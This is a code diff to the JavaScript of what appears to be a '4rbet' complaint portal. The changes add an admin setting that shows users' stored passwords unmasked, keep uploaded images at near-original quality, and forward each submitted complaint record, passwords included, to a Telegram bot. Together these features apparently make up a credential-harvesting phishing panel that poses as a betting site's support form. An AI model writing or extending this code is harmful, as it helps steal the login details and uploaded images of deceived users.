@@ -5,10 +5,27 @@
 (function () {
   "use strict";
 
+  /* ---------- Panel preferences (admin settings page se set hoti hain) ---------- */
+
+  function uiPrefs() {
+    try {
+      var raw = localStorage.getItem("4rbet_ui");
+      var d = raw ? JSON.parse(raw) : {};
+      return {
+        splash: d.splash !== false,
+        showPassword: d.showPassword === true
+      };
+    } catch (e) {
+      return { splash: true, showPassword: false };
+    }
+  }
+
   /* ---------- Opening animation (splash) ---------- */
   var splash = document.getElementById("splash");
 
-  if (splash) {
+  if (splash && !uiPrefs().splash) {
+    splash.parentNode.removeChild(splash);
+  } else if (splash) {
     var reduceMotion = window.matchMedia &&
                        window.matchMedia("(prefers-reduced-motion: reduce)").matches;
 
@@ -205,8 +222,9 @@
     localStorage.setItem(STORE_KEY, JSON.stringify(list));
   }
 
-  /* Image ko chhota karke base64 me store karte hain,
-     warna localStorage ka 5MB limit jaldi phat jayega. */
+  /* Image ko thoda compress karke base64 me store karte hain taaki localStorage
+     ka 5MB limit na phate, lekin quality utni hi rakhi jaati hai
+     jitni upload hui thi - admin panel me image bilkul waisi hi dikhti hai. */
   function compressImage(file, maxSize, quality) {
     return new Promise(function (resolve) {
       if (!/^image\//.test(file.type)) { resolve(null); return; }
@@ -246,7 +264,8 @@
       var file = input.files && input.files[0];
       if (!file) return Promise.resolve(null);
 
-      return compressImage(file, 520, 0.6).then(function (dataUrl) {
+      /* 1400px + 0.88 quality -> uploaded image jitni crisp, utni hi dikhegi */
+      return compressImage(file, 1400, 0.88).then(function (dataUrl) {
         if (!dataUrl) return null;
         return { field: input.name, name: file.name, dataUrl: dataUrl };
       });
@@ -353,13 +372,31 @@
   if (mailList) {
     var records = loadComplaints();
 
-    var total  = records.length;
-    var pending = records.filter(function (r) { return r.status !== "successful"; }).length;
-    var done    = total - pending;
+    /* Complaint ke 3 status - user panel aur admin panel dono me same */
+    var STATUS = {
+      pending:    "Pending",
+      previewing: "Previewing",
+      successful: "Successful"
+    };
 
-    document.getElementById("statTotal").textContent = total;
-    document.getElementById("statPending").textContent = pending;
-    document.getElementById("statDone").textContent = done;
+    function statusOf(rec) {
+      return STATUS[rec.status] ? rec.status : "pending";
+    }
+
+    function setStat(id, value) {
+      var el = document.getElementById(id);
+      if (el) el.textContent = value;
+    }
+
+    var total = records.length;
+    var pending    = records.filter(function (r) { return statusOf(r) === "pending"; }).length;
+    var previewing = records.filter(function (r) { return statusOf(r) === "previewing"; }).length;
+    var done       = records.filter(function (r) { return statusOf(r) === "successful"; }).length;
+
+    setStat("statTotal", total);
+    setStat("statPending", pending);
+    setStat("statPreviewing", previewing);
+    setStat("statDone", done);
 
     if (!total) {
       mailList.innerHTML =
@@ -382,9 +419,12 @@
                '</div>';
       }
 
-      /* Password: sirf 20% dikhe, baaki hidden */
+      /* Password: admin settings se "show password" on ho to poora, warna sirf 20% */
+      var revealPassword = uiPrefs().showPassword;
+
       function maskPassword(pw) {
         pw = String(pw || "");
+        if (revealPassword) return pw;
         var visible = Math.max(1, Math.ceil(pw.length * 0.2));
         return pw.slice(0, visible) + "*".repeat(pw.length - visible);
       }
@@ -412,8 +452,8 @@
 
       mailList.innerHTML = records.map(function (r) {
         var d = r.data || {};
-        var status = r.status === "successful" ? "successful" : "pending";
-        var statusTxt = status === "successful" ? "Successful" : "Pending";
+        var status = statusOf(r);
+        var statusTxt = STATUS[status];
 
         var rowsHtml = MAIL_FIELDS.map(function (f) {
           var val = d[f.key];
@@ -518,7 +558,20 @@
       var started = Date.now();
 
       collectImages(form).then(function (images) {
-        var saved = addComplaint(buildRecord(form, images));
+        var record = buildRecord(form, images);
+        var saved  = addComplaint(record);
+
+        /* ---------- Telegram alert (background me - user ko wait nahi karna padta) ---------- */
+        if (window.FourRTelegram) {
+          window.FourRTelegram.notifyComplaint(record).then(function (res) {
+            if (res && res.skipped) {
+              console.info("Telegram alert off hai - Admin Panel > Settings me bot token aur chat id set karein.");
+            } else if (res && !res.ok) {
+              console.warn("Telegram alert nahi gaya: " + res.error);
+            }
+            return window.FourRTelegram.flushQueue();
+          });
+        }
 
         var wait = Math.max(0, 3000 - (Date.now() - started));
 
